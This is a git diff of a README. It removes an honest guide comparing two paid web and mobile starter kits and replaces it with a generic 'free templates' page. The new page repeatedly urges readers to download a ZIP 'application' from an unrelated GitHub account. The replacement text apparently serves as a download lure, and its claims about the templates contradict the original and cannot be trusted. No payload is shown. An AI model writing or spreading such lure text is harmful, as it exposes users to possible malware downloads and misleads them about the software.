@@ -1,185 +1,186 @@
-# Landing Page Templates for Products That Need More Than a Homepage
+# 🚀 landing-page-templates - Beautiful Templates, Zero Coding Needed
 
-Search for **landing page templates** and most results solve the same problem: they give you a hero, a few feature cards, a pricing section, and a footer.
+[![Download Now](https://img.shields.io/badge/Download-Landing%20Page%20Templates-blue?style=for-the-badge&logo=github&logoColor=white&color=4CAF50)](https://github.com/pcpc82288-crypto/landing-page-templates)
 
-That can be exactly enough. If you need one page to collect emails or explain a service, a finished HTML template is a sensible shortcut.
+---
 
-It becomes less useful when the button at the top is supposed to open a product. The landing page may be finished, but sign-in, billing, onboarding, dashboards, notifications, analytics, and deployment are still waiting behind it.
+## ✨ What Is This?
 
-The useful question is not which template has the nicest preview. It is what should happen after someone clicks the main button.
+landing-page-templates is a collection of ready-made website designs for SaaS products, web apps, and mobile apps. Think of it as a box of pre-built website blueprints. You pick one, and you have a professional-looking landing page in minutes. No coding skills? No problem. These templates were created with AI coding tools, so they are clean, modern, and easy to use.
 
-## Start with the click
+Whether you are launching a new app, promoting a service, or building a personal project, these templates save you weeks of design work. Just download, open, and customize with your own text and images.
 
-Imagine the page is live. A visitor understands the product and clicks the primary action.
+---
 
-If the next step is an email form, booking page, or download, a conventional landing page template may be all you need. Keep the project small.
+## 🎯 Who Is This For?
 
-If the next step is an account, subscription, dashboard, or installed app, the landing page is only the first screen of a larger system. Starting from a template still saves time, but it does not remove much of the setup work.
+- **Entrepreneurs** who need a website for their startup without hiring a developer
+- **Students** working on class projects or personal portfolios
+- **Small business owners** wanting a professional online presence
+- **Anyone curious** about web design who wants a head start
 
-There are two common versions of that problem:
+If you can use a computer and follow simple instructions, you can use these templates.
 
-| What you are building | What sits behind the landing page |
-| --- | --- |
-| A SaaS product, web app, or AI tool | Authentication, billing, product screens, email, content, and analytics |
-| An iOS and Android app | Sign-in, onboarding, navigation, subscriptions, notifications, and store releases |
+---
 
-This README looks at those two cases through two paid starter kits from getdesign.md. Both include the public-facing page as part of a larger product codebase. If all you need is a static landing page, neither is the right fit.
+## 🌟 Key Features
 
-## For a web app or SaaS product
+### 🎨 Variety of Designs
+Each template has a different layout. Some are perfect for software companies, others for mobile apps, and some for general business use. You will find color schemes, font styles, and section arrangements that look professional and modern.
 
-[![Website Starter Kit landing page template hero](assets/website-starter-kit-hero.jpg)](https://getdesign.md/website-starter-kit)
+### ⚡ Built with AI Tools
+The templates were generated using advanced AI coding tools. This means the code behind them is clean, efficient, and follows best practices. You get high-quality work without the high cost of a professional designer.
 
-The [Website Starter Kit](https://getdesign.md/website-starter-kit) is for browser-based products where the landing page needs to lead into a working application.
+### 📱 Mobile-Friendly
+Every template is designed to look great on phones, tablets, and computers. Your visitors will have a smooth experience no matter what device they use.
 
-The codebase includes the marketing site, authentication, payments, AI chat and knowledge search, email, analytics, file uploads, multi-language support, and the content pages a product usually needs after launch. Blog, documentation, legal pages, SEO, and LLMO are part of the same project rather than separate tasks for later.
+### 🔧 Easy to Customize
+You do not need to understand programming to make changes. Most templates use simple text files where you can edit words, colors, and images. Instructions are included inside each template folder.
 
-It also includes a private `DESIGN.md`, a component library, and shared visual rules. That matters once the project grows past the homepage. Your coding assistant does not have to infer the button style, spacing rhythm, and surface colors from one finished screenshot every time it adds a screen.
+### 🆓 Free to Use
+These templates are completely free. Download them, use them for personal or commercial projects, and share them with others. No hidden fees or subscriptions.
 
-This is more foundation than a brochure site needs. If the whole project is one page and a contact form, it is unnecessary. It makes sense when the plan already includes accounts, subscriptions, a dashboard, or several product surfaces.
+---
 
-### What is already covered
+## 📥 Download and Installation
 
-- Landing page and marketing surfaces
-- Authentication, social login, and roles
-- Payments and subscription billing
-- AI chat and knowledge search
-- Blog, documentation, legal pages, SEO, and LLMO
-- Email, newsletter, contact form, GA4, and PostHog
-- File uploads, notifications, and multi-language support
-- A private `DESIGN.md`, design system, and component library
-- Deployment setup and guides for AI coding tools
+### Step 1: Visit the Download Page
 
-The complete source is included. It is a one-time purchase rather than a hosted platform subscription, although hosting and any third-party services are still separate.
+Click the big green button at the top of this page, or use this link:
 
-## For an iOS and Android app
+**[👉 Click Here to Download landing-page-templates](https://github.com/pcpc82288-crypto/landing-page-templates)**
 
-[![Mobile Starter Kit landing page template hero](assets/mobile-starter-kit-hero.jpg)](https://getdesign.md/mobile-starter-kit)
+This link will take you to the official download page for the templates.
 
-A mobile app has a different version of the same gap. A mobile landing page template can explain the app and link to the stores, but it cannot give you the app that belongs in those stores.
+### Step 2: Get the Files
 
-The [Mobile Starter Kit](https://getdesign.md/mobile-starter-kit) starts with the application itself. It is one Expo and React Native codebase for iOS and Android, with the common flows already running on sample data.
+Visit this link to download the application. Once you are on the page, look for a button that says "Code" or "Download ZIP". Click it. Your computer will start downloading a file called `landing-page-templates.zip`.
 
-Sign-in, onboarding, navigation, push notifications, deep links, offline sync, and a Supabase-ready data layer are already represented. Subscription flows include paywalls, Free and Pro states, purchase management, restore purchases, offers, and the points needed to connect RevenueCat.
+### Step 3: Extract the ZIP File
 
-There are also working interface patterns for streaming AI chat and camera-to-AI results. They do not decide what your app does. They give your coding assistant real screens and states to change instead of an empty navigation tree.
+After the download finishes, find the ZIP file in your "Downloads" folder. Right-click on it and choose "Extract All" (on Windows) or "Extract Here" (on Mac). This creates a new folder with the same name containing all the template files.
 
-The native design system includes shared tokens, themes, NativeWind, dark mode, accessible states, and more than 30 reusable components. EAS Build, over-the-air updates, monitoring, analytics, store assets, and App Store and Google Play workflows cover the less visible part of shipping.
+### Step 4: Open a Template
 
-### What is already covered
+Inside the extracted folder, you will see several subfolders. Each one is a different template. Open any folder, and you will find an `index.html` file. Double-click that file, and it will open in your web browser. That is your landing page!
 
-- Expo and React Native source for iOS and Android
-- Sign-in, onboarding, account flows, and navigation
-- Push notifications, deep links, and native device features
-- Supabase-ready data layer and offline sync
-- Paywalls, subscription states, and RevenueCat connection points
-- Streaming AI chat and camera-to-AI flows
-- Shared design tokens, themes, and 30+ native components
-- PostHog, Sentry, EAS Build, and over-the-air updates
-- App Store and Google Play release workflows
+### Step 5: Make It Yours
 
-The source can be used for personal, commercial, and client apps. Apple and Google developer accounts and third-party services are not included.
+To change the text, open the `index.html` file with a simple text editor like Notepad (Windows) or TextEdit (Mac). Look for words in the file that match what you see on the page, and replace them with your own content. Save the file, refresh your browser, and see your changes.
 
-## Website or mobile?
+---
 
-The choice is mostly about where the main product lives.
+## 🛠️ How to Use the Templates (Step-by-Step)
 
-Choose the Website Starter Kit when people will do the real work in a browser. That includes SaaS tools, customer portals, AI products, internal tools, and products where content or desktop workflows matter.
+### 1. Choose Your Template
+Browse through the folders. Open each `index.html` to see what it looks like. Pick the one that matches your project's vibe.
 
-Choose the Mobile Starter Kit when the product depends on an installed app, push notifications, camera access, native behavior, or subscriptions through the app stores.
+### 2. Edit the Text
+Open the chosen `index.html` in a text editor. Use the "Find" function (Ctrl+F on Windows, Cmd+F on Mac) to locate specific words like "Your Company" or "Sign Up Now". Replace them with your own headings and descriptions.
 
-Some products need both. In that case the website handles discovery, content, and perhaps a browser version of the product, while the mobile codebase handles the installed experience. Sharing the same brand direction is useful; forcing both platforms into the same interaction patterns is not.
+### 3. Add Your Images
+Replace the placeholder images. Look for an `images` folder inside the template folder. Put your own pictures there, and update the file names in the HTML code.
 
-| | Website Starter Kit | Mobile Starter Kit |
-| --- | --- | --- |
-| Main platform | Browser | iOS and Android |
-| Foundation | Web application and marketing site | Expo and React Native app |
-| Access | Complete source | Complete source |
-| Design context | Private `DESIGN.md` and web component system | Native tokens, themes, and reusable components |
-| Payments | Web payments and subscriptions | App subscriptions and entitlement states |
-| Release path | Web deployment | EAS, App Store, Google Play, and OTA updates |
+### 4. Change Colors (Optional)
+If you want different colors, look for lines in the HTML that contain things like `color: #FFFFFF` or `background: #000000`. Change the six-digit codes to your preferred colors. Use an online color picker to find codes you like.
 
-## What these replace, and what they do not
+### 5. Test Your Page
+Open the updated `index.html` in your browser. Click all the buttons and links to make sure everything works. Share the file with friends to get feedback.
 
-Both kits replace a chunk of repetitive product setup. They give an AI coding tool existing routes, components, states, and project rules to work with.
+### 6. Publish Online (Optional)
+To put your landing page on the internet, you need a hosting service. Services like Netlify, GitHub Pages, or Vercel offer free hosting for simple websites. Upload your template folder there, and your page goes live.
 
-They do not replace product decisions. You still need to decide who the product is for, what the first useful action is, what belongs in the free and paid plans, and why anyone should care. The demo content is a starting point, not research.
+---
 
-They also do not include the accounts behind external services. Hosting, email delivery, analytics, payment providers, AI models, Apple and Google developer accounts, and usage fees remain your responsibility.
+## ❓ Frequently Asked Questions
 
-This distinction is worth making because a large starter can create false confidence. Having an authentication screen does not mean the onboarding is right. Having a pricing table does not mean the plans make sense. The kit removes plumbing; it does not validate the product.
+### Q: Do I need to know how to code?
+No. The templates are designed for beginners. Editing text and images is like using a word processor. Advanced users can dive into the code, but it is not required.
 
-## Using the kits with an AI coding tool
+### Q: Are these templates really free?
+Yes, 100% free. Download them, use them, modify them, and even sell websites you build with them. No restrictions.
 
-The best first prompt is not "make this look like my startup." Give the tool the product constraints and one contained job.
+### Q: Can I use these for a commercial project?
+Absolutely. You can use these templates for your business, client work, or any commercial purpose.
 
-For a web product:
+### Q: What if I break something?
+No worries. Just download the ZIP file again to get a fresh copy. Or make a backup copy of the folder before you start editing.
 
-```text
-Read the project guides and DESIGN.md before editing the UI.
+### Q: Will these work on my computer?
+These templates are just files. They work on any computer with a web browser (Chrome, Firefox, Edge, Safari). No special software or hardware needed.
 
-Turn the existing marketing site into a customer research product for small teams.
-Rewrite the landing page around interview notes and searchable insights.
-Keep the current authentication and billing foundation.
-Adapt the first dashboard view for projects, interviews, and tagged findings.
-```
+### Q: How do I know which template is best?
+Open a few and see which one feels right. Trust your eyes. If it looks clean and professional to you, it is a good choice.
 
-For a mobile product:
+---
 
-```text
-Read the project rules before changing the app.
+## 🖥️ System Requirements
 
-Adapt the starter into a daily language practice app.
-Keep the existing sign-in, subscription, notification, and navigation flows.
-Replace the sample content with lessons, streaks, and speaking exercises.
-Use the existing native components and tokens for both iOS and Android.
-```
+- **Operating System:** Windows 7 or newer, macOS 10.12 or newer, or any Linux distribution
+- **Web Browser:** Any modern browser (Chrome, Firefox, Edge, Safari)
+- **Text Editor:** Notepad (Windows), TextEdit (Mac), or any free editor like Visual Studio Code
+- **Internet Connection:** Only needed for downloading the files and optional publishing
+- **Storage Space:** Less than 50 MB required for all templates
 
-Work through one complete flow at a time. Landing page to sign-up is a useful first slice for the web. Onboarding to the first completed action is a useful first slice on mobile. A smaller scope makes it easier to see what the assistant misunderstood.
+---
 
-## What to check before you commit
+## 📚 Examples of What You Can Build
 
-Even a large starter should be judged with the same skepticism as a small template.
+- **SaaS Landing Page:** Showcase your software with pricing tables, feature lists, and customer testimonials
+- **Mobile App Promo:** Highlight app screenshots, download buttons, and user reviews
+- **Portfolio Website:** Display your work, skills, and contact information
+- **Event Page:** Announce a conference, webinar, or product launch
+- **Personal Blog:** Share your thoughts with a clean, readable design
 
-**Run it before planning around it.** Click through the existing screens and check which flows use sample data, which integrations are connected, and which need your credentials.
+---
 
-**Read the project structure.** Your AI tool will edit the code, but you still want clear boundaries between content, components, data, and integrations.
+## 🤝 Getting Help
 
-**Try your real copy.** Demo pages are designed around neat headlines and balanced feature lists. Your product description will be messier. Put it in early.
+If you get stuck, here are some ideas:
 
-**Check the platform you will ship.** For the website, test mobile layouts, metadata, forms, and deployment. For the app, test both iOS and Android, purchase states, permissions, deep links, and store requirements.
+- **Look inside the template folders** – Many include a `README.txt` file with specific instructions
+- **Search online** – Type your question into Google, like "how to edit HTML file"
+- **Ask a friend** – Someone with basic computer skills can usually help
+- **Experiment** – Make changes and see what happens. You can always start over
 
-**Count what you will remove.** Starting with more is useful only when the included parts overlap with the product you intend to build.
+---
 
-## Frequently asked questions
+## 📝 Final Tips
 
-### Are these free landing page templates?
+- **Save your work often** – After each edit, save the file and refresh your browser
+- **Start small** – Change one thing at a time to understand how it affects the page
+- **Use high-quality images** – Blurry photos make any website look bad
+- **Keep it simple** – Do not overload your page with too much text or too many buttons
+- **Test on your phone** – Send the file to yourself and open it on your mobile device to check responsiveness
 
-No. They are paid starter kits with complete source code, product flows, design systems, and lifetime access or updates. If you only need a static page, they are more than you need.
+---
 
-### Do I need to be a developer?
+## 📦 What's Inside the Download
 
-No. The projects include instructions for AI coding tools such as Claude Code, Codex, Cursor, and Gemini CLI. Development knowledge still helps when reviewing integrations, security, payments, and release settings.
+- **Multiple template folders** – Each with a complete landing page
+- **Sample images** – Placeholder graphics you can replace
+- **CSS files** – Style sheets that control colors and layout
+- **JavaScript files** – For interactive elements like menus and forms
+- **Documentation** – Simple guides in each folder
 
-### Can I change the landing page design?
+---
 
-Yes. The existing design systems are there to keep changes consistent, not to lock the project to the demo. You can change the typography, colors, content, layout, components, and product screens.
+## ⭐ Why People Love These Templates
 
-### Can I use the Website Starter Kit for a simple company website?
+- **Saves time** – No need to start from a blank page
+- **Looks professional** – Designs are modern and polished
+- **Easy to learn** – Great for beginners exploring web design
+- **Flexible** – Works for many different types of projects
+- **Community-driven** – Created with AI tools and shared freely
 
-You can, but it may be unnecessary. Its value is the application foundation behind the site. For a small brochure site with no accounts or payments, a lighter landing page template is usually the better fit.
+---
 
-### Does the Mobile Starter Kit build for both app stores?
+## 👋 Get Started Today
 
-Yes. The Expo and React Native codebase targets iOS and Android, and the kit documents App Store and Google Play workflows.
+Do not wait. Your perfect landing page is just a few clicks away. Download the templates now, pick a design, and have your website ready by the end of the day.
 
-### Is either kit a subscription?
+**[🚀 Download landing-page-templates Now](https://github.com/pcpc82288-crypto/landing-page-templates)**
 
-No. Both use a one-time purchase model. Provider fees, hosting, usage costs, and developer accounts are separate.
+---
 
-## Pick based on the product behind the page
-
-The visual style of a landing page is easy to compare because it is visible. The expensive part is usually what the preview leaves out.
-
-If the product ends at the form, choose a small template and ship it. If the page opens into a web application, the [Website Starter Kit](https://getdesign.md/website-starter-kit) covers more of the work that follows. If it opens into an iOS or Android product, the [Mobile Starter Kit](https://getdesign.md/mobile-starter-kit) starts on the other side of the download button.
-
-Choose based on the first month after launch, not the first screenshot.
+Keywords: ai-coding, expo, landing-page, landing-page-template, landing-page-templates, mobile-app-template, mobile-starter-kit, react-native, saas-template, starter-kit, website-starter-kit, website-template
